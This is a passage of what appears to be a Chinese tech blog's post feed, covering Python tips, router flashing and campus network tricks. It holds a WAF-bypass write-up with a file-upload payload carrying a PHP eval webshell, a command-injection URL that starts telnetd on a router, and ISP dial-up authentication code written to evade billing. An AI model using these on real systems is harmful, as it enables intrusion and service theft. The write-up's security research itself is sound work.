      <content type="text"><![CDATA[问题出现：You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings. 产生原因：问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。 解决方法：1. 按提示12connection = sqlite3.connect(...)connection.text_factory = str 但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2 2. 以utf8的编码格式进行解码转为unicode编码做插入1234cursor.execute(''' INSERT INTO JAVBUS_DATA (姓名, 年龄) VALUES (?, ?) ''', ('张三'.decode('utf-8'), '22岁'.decode('utf-8'))) 但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子 1234567891011121314151617181920212223#-*-coding:utf-8-*-import sqlite3def decode_utf8(aStr): return aStr.decode('utf-8')conn = sqlite3.connect("something.db")cursor = conn.cursor()cursor.execute(''' CREATE TABLE IF NOT EXISTS JAVBUS_DATA( id INT PRIMARY KEY, 姓名 TEXT, 年龄 TEXT);''')print "Table created successfully"cursor.execute(''' INSERT INTO JAVBUS_DATA (姓名, 年龄) VALUES (?, ?) ''', map(decode_utf8, ('张三', '22岁')))cursor.close()conn.commit()conn.close() 其他注意：有时用第二种方法会出现UnicodeDecodeError加入#--coding:utf-8--还是不行请sys指定编码：123import sys reload(sys) sys.setdefaultencoding('utf8') 这个问题在python3应该不会出现，python2编码问题，仅作记录]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[WAF攻防研究之四个层次Bypass WAF]]></title>
      <url>%2F2016%2F09%2F25%2FWAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass-WAF.html</url>
      <content type="text"><![CDATA[绝对值得一看的技术文章pdf下载链接 [via@破-见 ]]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed]]></title>
      <url>%2F2016%2F09%2F24%2FPHP-DOS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%EF%BC%9ACVE-2015-4024-Reviewed.html</url>
      <content type="text"><![CDATA[1. 背景介绍今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，https://bugs.php.net/bug.php?id=69364。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。 目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。 接下来，我们以PHP为例，详细解析我们的绕过方法。 2. 绕过WAF的原理根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。 123456789101112131415prev_len= strlen(prev_entry.value);cur_len= strlen(line);entry.value= emalloc(prev_len + cur_len + 1); //1次分片内存memcpy(entry.value,prev_entry.value, prev_len); //1次拷贝memcpy(entry.value+ prev_len, line, cur_len); //1次拷贝entry.value[cur_len+ prev_len] = '\0';entry.key= estrdup(prev_entry.key);zend_llist_remove_tail(header);//1次内存释放 而PHP官方修复方案，在进行合并时，避免重复拷贝，从而避免DOS。绕过WAF的关键在于，PHP multipart_buffer_headers函数解析header对应value时，value值存在多行。每行的字符串以空白符开头或不存字符’:’，将进行合并。而WAF在解析文件上传的文件名时，没有考虑协议兼容，不进行多行合并，就可以被绕过。 根据原理构造绕过WAF文件上传防御的payload，WAF解析到的文件名为”test3.jpg”，而PHP解析到的文件名是”test3.jpg\nf/shell.php”，因为”/”是目录分隔符，上传的文件名变为shell.php。以下是绕过paylaod、测试脚本、paylaod进行文件上传的效果图。 WAF绕过payload:123456789------WebKitFormBoundaryx7V4AhipWn8ig52yContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test3.jpg\nsf/shell.phpContent-Type: application/octet-stream&lt;?php eval($_GET[&apos;c&apos;])?&gt;------WebKitFormBoundaryx7V4AhipWn8ig52y 文件上传功能测试脚本:1234567891011121314151617&lt;?php $name = $_FILES['file']['name']; echo $name; echo "\n"; move_uploaded_file($_FILES['file']['tmp_name'] , '/usr/local/nginx/html/upload/'.$_FILES['file']['name']); echo "upload success! ".$_FILES['file']['name']; echo "\n"; echo strlen($_FILES['file']['name']);?&gt; Payload能够正常上传 3. 绕过WAF实战笔者通过搭建自己的测试站，接入360网站卫士和加速乐，验证绕过WAF文件上传防御的方法。 3.1 绕过360网站卫士步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。 步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。 3.2 绕过知道创宇加速乐步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。 步骤二：成功绕过加速乐，上传shell，文件是syt.php。 3.3. 绕过百度云加速百度云加速与CloudFlare，从百度匀加速拦截页面可以看出使用的是CloudFlare. 但是估计有本地化，百度云加速应该是百度和CloudFlare共同产物吧。测试百度没有搭建自己的测试环境，找了个接入了百度云加速的站进行测试。 步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。 步骤二：成功绕过云加速同上 4. 扩展—更多的工作4.1 分析filename其他字符的绕过同理，我们发现除了双引号外，使用单引号也能绕过WAF的防御，并实现文件上传。 123456789------WebKitFormBoundaryx7V4AhipWn8ig52yContent-Disposition: form-data; name=&quot;file&quot;; filename=&apos;test3.jpg\nsf/shell.phpContent-Type: application/octet-stream&lt;?php eval($_GET[&apos;c&apos;])?&gt;------WebKitFormBoundaryx7V4AhipWn8ig52y 4.2 分析其他应用脚本语言我们也发现jsp解析也有自己的特点，同时可被用于绕过WAF。暂时未测试asp,aspx,python等常用的WEB应用脚本语言。 5. 修复方案5.1 修复方案一解析文件上传请求时，如果发现请求不符合协议规范，则拒绝请求。可能会产生误拦截，需要评估误拦截的影响范围。 5.2 修复方案二兼容php的文件解析方式，解析文件名时，以单引号或双引号开头，并且对应的单引号双引号闭合。 6. 总结本文通过Review PHP远程dos漏洞(CVE-2015-4024)，并利用该特性绕过现有WAF的文件上传防御，成功上传shell。 更重要的价值，提供给我们一个绕过WAF的新思路，一种研究新方向：利用后端应用脚本与WAF行为的差异绕过WAF的防御。总的来说，一款优秀的WAF应该能够处理兼容WEB应用容器、标准协议、web服务器这间的差异。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[基于Openwrt+Shadowsocks+ipv6实现校园网免流量无限时长上网]]></title>
      <url>%2F2016%2F09%2F24%2F%E5%9F%BA%E4%BA%8EOpenwrt-Shadowsocks-ipv6%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%85%8D%E6%B5%81%E9%87%8F%E6%97%A0%E9%99%90%E6%97%B6%E9%95%BF%E4%B8%8A%E7%BD%91.html</url>
      <content type="text"><![CDATA[转载自Dyhube 简述笔者利用笔记本电脑实现ipv6免费上网已经有一段时间了，原理是通过ipv6访问ipv4资源，在学校网络不限流量、不限时长、20兆带宽（我们学校ipv6限速上下对等20兆，没办法！）,电脑开热点全寝室共用，那真是爽翻天 ! 但是每天回到寝室总是打开电脑开热点还真是蛋疼的事情。再说电脑也不能总是开着吧。这时我就想能不能找个路由器，一天二十四小时开机，电脑、手机、平板随时都可以连。这个想法大概出现在半年前，由于手里没有路由器，就一直没弄，但是网上是有各种成功的案例的。 前段时间手里终于进了台K1，由于之前已经查了相当多的教程，所以就顺风顺水，很快就成功了。下面我就主要讲一下openwrt客户端的配置问题。 意义在大部分高校，ipv4一般是计流量或计时收费的，（笔者学校就是计时收费的，50元200小时网通十兆带宽）而且，由于校园的特殊性，相应的价格也比市面上宽带服务商要高。万幸的是，这些高校一般具有ipv6网络环境，并且由于国家的大力支持，普及范围广，而且不计算流量，聪明的人早就想能不能通过利用ipv6已达到免流量及无限时长上网？答案是可行的，鉴于目前公网的环境普遍是ipv4，我们可以找一台同时具有ipv4和ipv6地址的服务器，我们在校内通过ipv6访问服务器，然后服务器处理我们的访问请求以ipv4/ipv6双栈的方式代替我们访问互联网，再将数据通过ipv6反馈给我们，从而到达免流上网的目的。并且，考虑到大部分高校ipv6没有限制速度，理论上可以达到服务器出口的带宽，当然，具体取决于你们学校的ipv6出口带宽。 为什么用Shadowsocks？配置简单，真的简单！以前看到过信息学院的学长写的一篇blog,原理是ipv6 to ipv4 从而ipv6 to ipv4网络,其实原理是一样的，只是他用了openvpn这个软件，但是感觉实现起来好难。像这样的开源支持ipv6协议的软件还是有很多的，这里就不再陈述。 回到原题为什么用Shadowsocks，配置简单。vps服务提供商搬瓦工现在为了迎合国人的需求现在已经预配了Shadowsocks,只需要点击以下安装就ok了。 适用对象具有ipv6地址、ipv4流量（计时）收费贵爱折腾的大学生。不推荐打国服游戏，延迟你懂的，但对延迟没要求的游戏还是可以玩的，美服、亚服、台服随你玩。 准备openwrt固件路由器路由器的刷机请自行Google,教程一大堆，刷机时笔者也遇到过很多问题，坚持！如果你的也是K1路由器，也要刷机，不妨看这个教程。刷机的重点是刷Shadowsocks插件，我的K1直接刷的来自恩山网友的固件，固件里已经附带了Shadowsocks。openwrt固件自取。openwrt控制面板上图。 Shadowsocks+ipv6节点信息因为笔者手里有台美国的vps，并且配置了Shadowsocks，所以现在拿来就直接用，老实说搭建的Shadowsocks平常很少用，之前觉得租这个vps很是浪费。但是自从寝室里有了这台全天候开机的路由器，值了！在这里我要强调一下，Shadowsocks的节点我们需要ipv6地址的，不然还是没法走校内的ipv6通道。 前方高能预警操作首先openwrt固件路由器登陆192.168.1.1，初始登录默认密码是：admin。登进去之后最好先不要对任何东西改动，按照正常路由器的配置对路由器进行拨号上网。然后选择Shadowsocks插件，选择启动。（为什么这样做呢？笔者尝试了几下，不拨号上网的话，Shadowsocks和DNS配置好了以后无法上网，最后总结，先拨号上网、再配置Shadowsocks和DNS信息） 步骤：点击 openwrt服务&gt;Shadowsocks，出现以下界面。 Shadowsocks的配置1234服务器ip： 密码： 服务器端口： 加密方式： 对Shadowsocks配置好了以后，点击下面的透明代理，选择启动。 对Shadowsocks配置好以后，我们的任务还没有结束，最重要的就是配置DNS信息。这里如果不配置DNS，IP地址选择ipv4的，Shadowsocks是国外的，那么通过这种方式使用Shadowsocks就是通过路由器来翻fq，在这里我就不多说了。 DNS的配置DNS设置有两种方案，一种是利用ChinaDNS，还有一种直接在DHCP/DNS设置页面（网络&gt;DHCP/DNS）进行填写。 由于本次折腾的特殊性，路由器工作在纯ipv6环境下，也就是说路由器没有ipv4的网络，但常用的DNS服务器大多是以ipv4地址方式提供的，如果使用ipv4的DNS服务器就会导致无法解析。此处用了[2001:470:0:c0::2]，但是很不幸，该DNS被污染了，无法解析如google，youtube一类网址，但是对国内的网站的解析很好。 12001:470:0:c0::2 其他的DNS最好选择Google的，相对的来说，网站解析最全面，而且还可以fq,只是一部分了，选择Google的公共DNS有一个缺点，就是像移动端的微信或者qq了，朋友圈的信息或公众号加载不出来，这是很蛋疼的事情。个人还是推荐上面的那条DNS,速度快、国内网站全面，几乎全覆盖。 下面是一些从网上找来的公共DNS，可以试验一下，说不定有什么以外的收获呢。 12345678910111213ordns.he.net 2001:470:20::2 74.82.42.42tserv1.fmt2.he.net 2001:470:0:45::2 72.52.104.74tserv1.dal1.he.net 2001:470:0:78::2 216.218.224.42tserv1.ams1.he.net 2001:470:0:7d::2 216.66.84.46tserv1.mia1.he.net 2001:470:0:8c::2 209.51.161.58tserv1.tor1.he.net 2001:470:0:c0::2 216.66.38.58ns.ipv6.uni-leipzig.de 2001:638:902:1::10 139.18.25.34 Google Public DNS123google-public-dns-a.google.com 2001:4860:4860::8888 8.8.8.8google-public-dns-b.google.com 2001:4860:4860::8844 8.8.4.4 码字不容易，在这里非常感谢_Echo和张哲两人的post. 转载自Dyhube]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[OpenWRT路由器使用ipv6拨号上网教程]]></title>
      <url>%2F2016%2F09%2F22%2FOpenwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BD%BF%E7%94%A8ipv6%E6%8B%A8%E5%8F%B7%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B.html</url>
      <content type="text"><![CDATA[文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除 原理介绍分析：湖北E信地区可以使用ipv6拨号，好处是网络是上下对等不限速网络，也就是说，你的端口上限是多少，网上就可以达到多少，我测试很多次，一般在100M左右，但是遗憾的是，该拨号方式只能使用32位系统，且由于E信软件的兼容性问题，很容易导致蓝屏死机。经过大神的抓包分析，该拨号方式是使用ipv6的隧道协议传递ipv4信号。而幸运的是，现在的openwrt支持该协议。也就是说可以使用基于openwrt的路由器采用ipv6拨号。 操作步骤：首先要明确是，该拨号方式也是需要进行账号换算的，首先启动路由器，并插上网线，在电脑上下载winscp这款软件，然后我们查询一下我们的ip地址，在电脑的dos界面输入ipconfig，找到以太网配置器 默认网关就是路由器的管理ip。 然后我们启动软件，按照图片设置填入数据 然后我们就进入了路由器的文件系统 接着，我们要做的是，进入路由器设置里面设置相关端口参数 在电脑的浏览器里输入管理ip地址 进入端口设置界面 首先设置wan口参数 切换协议为PPPOE，并随便输入账号密码（具体的拨号的账号密码在后面我们会加以更改）并在高级设置里勾选以下参数 然后保存并应用 然后我们设置lan口参数 按照该图设置 最后，我们回到接口总界面，自己创建一个端口 名字无所谓，但协议要选择rfc6333 提交以后填写ipv6的地址，经过大神的尝试，下面给的这个地址是比较稳定的，建议使用 240e:d:1000::ffff:1:并在高级设置里面勾选默认网关 在防火墙设置里，把这个链接拉到wan口里 最后保存 这样，路由器上的设置就结束了，下面转入配置文件的修改上 依次顺序进入到如下路径 双击network文件打开 并在文件的位置更改 然后点击保存 然后进入到此目录，上传我们准备的E信算法库文件 最后重启一下路由器，同步一下路由器的时间，就可以了注意，不同的芯片和不同地区的openwrt路由器，sxplugin.so文件是不一样的，具体请查看我上一篇文章打包的东西。 再说一次，文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[给斐讯K1刷机并拨号e信(湖北地区测试无问题)]]></title>
      <url>%2F2016%2F09%2F22%2F%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98.html</url>
      <content type="text"><![CDATA[◆购买斐讯k1路由器路由器在天猫京东斐讯旗舰店都有售卖，我买的价格是159，不过有一张铃铛卡，一个月之后返还160元，相当于0元购 ◆路由器刷不死Breed1.路由与电脑有线连接好，输入192.168.2.1，完成设置 2.在浏览器地址栏输入：http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd(如果你的电脑ip不是192.168.2.100,请改成你电脑的ip(内网ip)) 3.打开tftp，这里用tftp32演示，按图设置 4.打开CMD,务必使用管理员权限，telnet 192.168.2.1 5.输入用户名密码 6.输入命令12345678910111) cd /tmp2) tftp –g –l /tmp/breed.bin –r breed.bin 192.168.2.1003) cat /dev/mtd1 &gt;/tmp/mtd1.bin cat /dev/mtd0 &gt;/tmp/mtd0.bin4) tftp –p –r mtd1.bin –l /tmp/mtd1.bin 192.168.2.100 tftp –p –r mtd1.bin –l /tmp/mtd1.bin 192.168.2.1005) mtd_write write breed.bin Bootloader 等待出现#字 7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面 懒人一键式安装法：输入：wget http://breed.hackpascal.net/breed-mt7620-reset1.bin然后输入：mtd_write write breed-mt7620-reset1.bin Bootloader 等待出现#字（代表着已经完成） 刷breed后语只要路由breed不被变动，路由刷错固件也不怕，同样方式进入breed刷回正确的即可。 推荐每次刷完固件后，去固件系统管理–恢复原厂默认值。 ◆刷openWRT1.刷新固件我在下面的文件中打包了两个固件，一个是潘多拉的K1专版，一个是openWRT，我自己使用的是专版潘多拉，各位看官自己选择，刷新固件很简单，看图 点击更新，看路由灯全部亮起后，无线网络出现,OK ◆安装e信(NetKeeper)插件并进行拨号1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin.so2.通过WINSCP登录你的路由器 注意使用scp协议，密码admin（第一次登录op需要重设密码依然设为admin就可以了 3.放入拨号插件登录之后打开路由器，在这儿选择/(root）然后选择/usr/lib/pppd/2.4.7文件夹将你编辑好的sxplugin.so文件放入即可（ 这里的sxplugin.so是自己更名的，湖北的就选择wuhan的来更名，文件在文末有打包 ） 4.设置帐号密码拨号通过浏览器登录浏览器打开网络下的接口选择WAN口点击修改，协议选择PPPOE即可，然后下面有个按钮点一下会出来填帐号密码的，账户和密码也要写对，我是重庆动态密码可以正常用。（蓝字我是加了中文包的，你刷了过后是英文呢，凑合看吧，加中文包需要路由器联网。） 最后点击保存应用退出 5.最后的配置通过WINSCP登录路由器同样打开文件夹/etc/config/找到network修改 在图中的位置输入option ‘pppd_options’ ‘plugin sxplugin.so’这个代码即可（注意粘贴后字体是否一致，主要是‘号的问题，可保存后再打开查看，必须搞定字体格式才行），到此netkeeper就安装完了。最后重启路由器，到系统里面选时区，同步浏览器时间，保存。再到wan点击连接就能联网了。（如果进不去wan这个界面就是设置错了） 最后要说的，这个可用的原因是湖北地区e信2.5的算法依旧可用，有的地区加了心跳，有的地区强制升级了，并不可用,教程到此处完结，后面的有能力可以看看，工具教程打包在文末 ◆闪讯算法源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;string.h&gt;#include &lt;pppd/pppd.h&gt;#include &lt;pppd/md5.h&gt;typedef unsigned char byte;char pppd_version[] = VERSION;static char saveuser[MAXNAMELEN] = &#123;0&#125;;static char savepwd[MAXSECRETLEN] = &#123;0&#125;;static void getPIN(byte *userName, byte *PIN)&#123; int i,j;//循环变量 long timedivbyfive;//时间除以五 time_t timenow;//当前时间，从time()获得 byte RADIUS[16];//凑位字符 byte timeByte[4];//时间 div 5 byte beforeMD5[32];//时间 div 5+用户名+凑位 MD5_CTX md5;//MD5结构体 byte afterMD5[16];//MD5输出 byte MD501H[2]; //MD5前两位 byte MD501[3]; byte timeHash[4]; //时间div5经过第一次转后后的值 byte temp[32]; //第一次转换时所用的临时数组 byte PIN27[6]; //PIN的2到7位，由系统时间转换 //code info("sxplugin : using zjxinlisx01"); strcpy(RADIUS, "zjxinlisx01"); timenow = time(NULL); timedivbyfive = timenow / 5; for(i = 0; i &lt; 4; i++) &#123; timeByte[i] = (byte)(timedivbyfive &gt;&gt; (8 * (3 - i)) &amp; 0xFF); &#125; for(i = 0; i &lt; 4; i++) &#123; beforeMD5[i]= timeByte[i]; &#125; for(i = 4; i &lt; 16 &amp;&amp; userName[i-4]!='@' ; i++) &#123; beforeMD5[i] = userName[i-4]; &#125; j=0; while(RADIUS[j]!='\0') beforeMD5[i++] = RADIUS[j++]; MD5_Init(&amp;md5); MD5_Update (&amp;md5, beforeMD5, i); printf("%d %s\n",i,beforeMD5); MD5_Final (afterMD5, &amp;md5); MD501H[0] = afterMD5[0] &gt;&gt; 4 &amp; 0xF; MD501H[1] = afterMD5[0] &amp; 0xF; sprintf(MD501,"%x%x",MD501H[0],MD501H[1]); for(i = 0; i &lt; 32; i++) &#123; temp[i] = timeByte[(31 - i) / 8] &amp; 1; timeByte[(31 - i) / 8] = timeByte[(31 - i) / 8] &gt;&gt; 1; &#125; for (i = 0; i &lt; 4; i++) &#123; timeHash[i] = temp[i] * 128 + temp[4 + i] * 64 + temp[8 + i] * 32 + temp[12 + i] * 16 + temp[16 + i] * 8 + temp[20 + i] * 4 + temp[24 + i] * 2 + temp[28 + i]; &#125; temp[1] = (timeHash[0] &amp; 3) &lt;&lt; 4; temp[0] = (timeHash[0] &gt;&gt; 2) &amp; 0x3F; temp[2] = (timeHash[1] &amp; 0xF) &lt;&lt; 2; temp[1] = (timeHash[1] &gt;&gt; 4 &amp; 0xF) + temp[1]; temp[3] = timeHash[2] &amp; 0x3F; temp[2] = ((timeHash[2] &gt;&gt; 6) &amp; 0x3) + temp[2]; temp[5] = (timeHash[3] &amp; 3) &lt;&lt; 4; temp[4] = (timeHash[3] &gt;&gt; 2) &amp; 0x3F; for (i = 0; i &lt; 6; i++) &#123; PIN27[i] = temp[i] + 0x020; if(PIN27[i]&gt;=0x40) &#123; PIN27[i]++; &#125; &#125; PIN[0] = '\r'; PIN[1] = '\n'; memcpy(PIN+2, PIN27, 6); PIN[8] = MD501[0]; PIN[9] = MD501[1]; strcpy(PIN+10, userName);&#125;static int pap_modifyusername(char *user, char* passwd)&#123; byte PIN[MAXSECRETLEN] = &#123;0&#125;; getPIN(saveuser, PIN); strcpy(user, PIN); info("sxplugin : user is %s ",user);&#125;static int check()&#123; return 1;&#125;void plugin_init(void)&#123; info("sxplugin : init"); strcpy(saveuser,user); strcpy(savepwd,passwd); pap_modifyusername(user, saveuser); info("sxplugin : passwd loaded"); pap_check_hook=check; chap_check_hook=check;&#125; ◆下载地址 (访问码:4854)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Visual Studio Code配置Python开发环境]]></title>
      <url>%2F2016%2F06%2F29%2FVisual-Studio-Code%E9%85%8D%E7%BD%AEPython%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83.html</url>
      <content type="text"><![CDATA[1.安装Python插件在VScode界面按Crtl+Shift+P或者F1 输入ext install 直接安装Python，也就是点击它，然后等待，安装好后会提示你重启 2.配置运行Python程序同样的打开命令面板（Crtl+Shift+P或F1），然后输入Tasks: Configure Task Runner（中文输入：任务，然后选择任务：配置任务运行程序），选择Other 此时VScode会自动生成.vscode文件夹并生成一个默认的task.json 配置如下 &quot;version&quot;: &quot;0.1.0&quot;, &quot;command&quot;: &quot;python&quot;, &quot;isShellCommand&quot;: true, &quot;args&quot;: [&quot;${file}&quot;], &quot;showOutput&quot;: &quot;always&quot; 然后写完代码后Crtl+Shift+B运行Py程序]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python之Requests的高级用法]]></title>
      <url>%2F2016%2F06%2F10%2FPython%E4%B9%8BRequests%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95.html</url>
      <content type="text"><![CDATA[高级用法 本篇文档涵盖了Requests的一些更加高级的特性。 会话对象 会话对象让你能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookies。 会话对象具有主要的Requests API的所有方法。 我们来跨请求保持一些cookies: 1234567s = requests.Session()s.get('http://httpbin.org/cookies/set/sessioncookie/123456789')r = s.get("http://httpbin.org/cookies")print(r.text)# '&#123;"cookies": &#123;"sessioncookie": "123456789"&#125;&#125;' 会话也可用来为请求方法提供缺省数据。这是通过为会话对象的属性提供数据来实现的: 123456s = requests.Session()s.auth = ('user', 'pass')s.headers.update(&#123;'x-test': 'true'&#125;)# both 'x-test' and 'x-test2' are sents.get('http://httpbin.org/headers', headers=&#123;'x-test2': 'true'&#125;) 任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。 从字典参数中移除一个值有时你会想省略字典参数中一些会话层的键。要做到这一点，你只需简单地在方法层参数中将那个键的值设置为 None ，那个键就会被自动省略掉。 包含在一个会话中的所有数据你都可以直接使用。学习更多细节请阅读 会话API文档 。 请求与响应对象 任何时候调用requests.*()你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 requests 得到一个从 服务器返回的响应就会产生一个 Response 对象。该响应对象包含服务器返回的所有信息， 也包含你原来创建的 Request 对象。如下是一个简单的请求，从Wikipedia的服务器得到 一些非常重要的信息: 1&gt;&gt;&gt; r = requests.get('http://en.wikipedia.org/wiki/Monty_Python') 如果想访问服务器返回给我们的响应头部信息，可以这样做: 123456789&gt;&gt;&gt; r.headers&#123;'content-length': '56170', 'x-content-type-options': 'nosniff', 'x-cache':'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet', 'content-encoding':'gzip', 'age': '3080', 'content-language': 'en', 'vary': 'Accept-Encoding,Cookie','server': 'Apache', 'last-modified': 'Wed, 13 Jun 2012 01:33:50 GMT','connection': 'close', 'cache-control': 'private, s-maxage=0, max-age=0,must-revalidate', 'date': 'Thu, 14 Jun 2012 12:59:39 GMT', 'content-type':'text/html; charset=UTF-8', 'x-cache-lookup': 'HIT from cp1006.eqiad.wmnet:3128,MISS from cp1010.eqiad.wmnet:80'&#125; 然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部: 123&gt;&gt;&gt; r.request.headers&#123;'Accept-Encoding': 'identity, deflate, compress, gzip','Accept': '*/*', 'User-Agent': 'python-requests/0.13.1'&#125; Prepared Request 当你从API调用或Session调用得到一个Response对象，对于这个的request属性实际上是被使用的PreparedRequest，在某些情况下你可能希望在发送请求之前对body和headers(或其他东西)做些额外的工作，一个简单的例子如下: 123456789101112131415161718192021from requests import Request, Sessions = Session()req = Request('GET', url, data=data, headers=header)prepped = req.prepare()# do something with prepped.body# do something with prepped.headersresp = s.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout)print(resp.status_code) 因为你没有用Request对象做任何特别的事情，你应该立即封装它和修改 PreparedRequest 对象，然后携带着你想要发送到requests. 或 Session.的其他参数来发送它 但是，上面的代码会丧失一些Requests Session对象的优势，特别的，Session层的状态比如cookies不会被应用到你的其他请求中，要使它得到应用，你可以用Session.prepare_request()来替换 Request.prepare()，比如下面的例子: 12345678910111213141516171819202122from requests import Request, Sessions = Session()req = Request('GET', url, data=data headers=headers)prepped = s.prepare_request(req)# do something with prepped.body# do something with prepped.headersresp = s.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout)print(resp.status_code) SSL证书验证 Requests可以为HTTPS请求验证SSL证书，就像web浏览器一样。要想检查某个主机的SSL证书，你可以使用 verify 参数: 12&gt;&gt;&gt; requests.get('https://kennethreitz.com', verify=True)requests.exceptions.SSLError: hostname 'kennethreitz.com' doesn't match either of '*.herokuapp.com', 'herokuapp.com' 在该域名上我没有设置SSL，所以失败了。但Github设置了SSL: 12&gt;&gt;&gt; requests.get('https://github.com', verify=True)&lt;Response [200]&gt; 对于私有证书，你也可以传递一个CA_BUNDLE文件的路径给 verify 。你也可以设置 REQUEST_CA_BUNDLE 环境变量。 如果你将verify设置为False，Requests也能忽略对SSL证书的验证。 12&gt;&gt;&gt; requests.get('https://kennethreitz.com', verify=False)&lt;Response [200]&gt; 默认情况下， verify 是设置为True的。选项 verify 仅应用于主机证书。 你也可以指定一个本地证书用作客户端证书，可以是单个文件（包含密钥和证书）或一个包含两个文件路径的元组: 12&gt;&gt;&gt; requests.get('https://kennethreitz.com', cert=('/path/server.crt', '/path/key'))&lt;Response [200]&gt; 如果你指定了一个错误路径或一个无效的证书: 12&gt;&gt;&gt; requests.get('https://kennethreitz.com', cert='/wrong_path/server.pem')SSLError: [Errno 336265225] _ssl.c:347: error:140B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib 响应体内容工作流 默认情况下，当你进行网络请求后，响应体会立即被下载。你可以通过 stream 参数覆盖这个行为，推迟下载响应体直到访问 Response.content 属性: 12tarball_url = 'https://github.com/kennethreitz/requests/tarball/master'r = requests.get(tarball_url, stream=True) 此时仅有响应头被下载下来了，连接保持打开状态，因此允许我们根据条件获取内容: 123if int(r.headers['content-length']) &lt; TOO_LONG: content = r.content ... 你可以进一步使用 Response.iter_content 和 Response.iter_lines 方法来控制工作流，或者以 Response.raw 从底层urllib3的 urllib3.HTTPResponse &lt;urllib3.response.HTTPResponse 读取。 如果当你请求时设置stream为True，Requests将不能释放这个连接为连接池，除非你读取了全部数据或者调用了Response.close，这样会使连接变得低效率。如果当你设置 stream = True 时你发现你自己部分地读取了响应体数据(或者完全没读取响应体数据)，你应该考虑使用contextlib.closing,比如下面的例子: 1234from contextlib import closingwith closing(requests.get('http://httpbin.org/get', stream=True)) as r: # Do things with the response here. 保持活动状态（持久连接） 好消息 - 归功于urllib3，同一会话内的持久连接是完全自动处理的！同一会话内你发出的任何请求都会自动复用恰当的连接！ 注意：只有所有的响应体数据被读取完毕连接才会被释放为连接池；所以确保将 stream 设置为 False 或读取 Response 对象的 content 属性。 流式上传 Requests支持流式上传，这允许你发送大的数据流或文件而无需先把它们读入内存。要使用流式上传，仅需为你的请求体提供一个类文件对象即可: 12with open('massive-body') as f: requests.post('http://some.url/streamed', data=f) 块编码请求 对于出去和进来的请求，Requests也支持分块传输编码。要发送一个块编码的请求，仅需为你的请求体提供一个生成器（或任意没有具体长度(without a length)的迭代器）: 12345def gen(): yield 'hi' yield 'there'requests.post('http://some.url/chunked', data=gen()) POST 多个编码(Multipart-Encoded)文件 你可以在一个请求中发送多个文件，例如，假设你希望上传图像文件到一个包含多个文件字段‘images’的HTML表单 1&lt;input type=”file” name=”images” multiple=”true” required=”true”/&gt; 达到这个目的，仅仅只需要设置文件到一个包含(form_field_name, file_info)的元组的列表： 1234567891011&gt;&gt;&gt; url = 'http://httpbin.org/post'&gt;&gt;&gt; multiple_files = [('images', 